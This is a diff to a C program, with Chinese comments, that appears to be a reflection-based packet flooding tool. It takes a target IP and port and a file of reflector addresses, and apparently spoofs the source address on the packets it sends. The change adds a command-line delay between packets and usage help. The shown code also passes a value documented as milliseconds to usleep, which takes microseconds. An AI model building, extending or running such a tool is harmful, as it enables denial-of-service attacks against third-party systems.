@@ -13,14 +13,20 @@ unsigned short checksum(unsigned short *b, int len);
 // 主函数
 int main(int argc, char *argv[]) {
     // 检查参数数量
-    if (argc != 4) {
-        fprintf(stderr, "Usage: %s <目标ip> <目标port> <反射文件>\n", argv[0]);
+    if (argc != 5) {
+        fprintf(stderr, "Usage: %s <目标ip> <目标port> <反射文件> <延迟毫秒>\n", argv[0]);
+        printf("说明:\n");
+        printf("  目标IP: 发送数据包的目标地址（使用源IP发送）\n");
+        printf("  目标端口: 目标IP的端口号，用于接收数据\n");
+        printf("  反射文件: 存储反射数据的文件路径\n");
+        printf("  延迟毫秒: 在发送数据包之间的延迟时间（单位：毫秒），0表示没有延迟。\n");
         return 1;
     }
 
     char *source_ip = argv[1];  // 源IP地址
     int source_port = atoi(argv[2]);  // 源端口
     char *target_file = argv[3];  // 目标文件
+    int time = atoi(argv[4]); //延迟
 
     // 打开目标文件
     FILE *file = fopen(target_file, "r");
@@ -134,6 +140,7 @@ int main(int argc, char *argv[]) {
         }
 
         close(sockfd); // 关闭套接字
+        usleep(time);
     }
 
     fclose(file); // 关闭文件
